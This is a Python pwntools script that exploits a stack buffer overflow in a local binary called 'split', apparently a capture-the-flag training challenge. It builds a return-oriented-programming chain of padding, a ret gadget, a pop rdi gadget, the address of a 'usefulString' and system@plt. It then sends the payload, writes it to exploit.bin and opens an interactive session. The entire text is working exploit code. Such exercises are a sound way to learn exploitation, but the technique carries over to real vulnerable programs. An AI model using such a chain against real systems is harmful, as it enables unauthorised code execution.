from pwn import *

#context.log_level = "CRITICAL"
binary = './split'
exe = context.binary = ELF(binary)
#split = ELF(binary)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") 
context.log_level = "DEBUG"

#addresses
split_system = p64(exe.plt[b'system'])
pop_rdi = p64(0x400883) #: pop rdi; ret
cat_flag = p64(exe.symbols.get(b'usefulString'))
ret = p64(0x00000000004005b9)

padding = 40 * b'\x90'

IO = process(binary)
data = IO.recvn(0x4c)
log.info(data)

payload = padding + ret + pop_rdi + cat_flag + split_system
with open('./exploit.bin', 'wb') as fd:
    fd.write(payload)
IO.sendline(payload)
IO.interactive()
#IO.recvall()
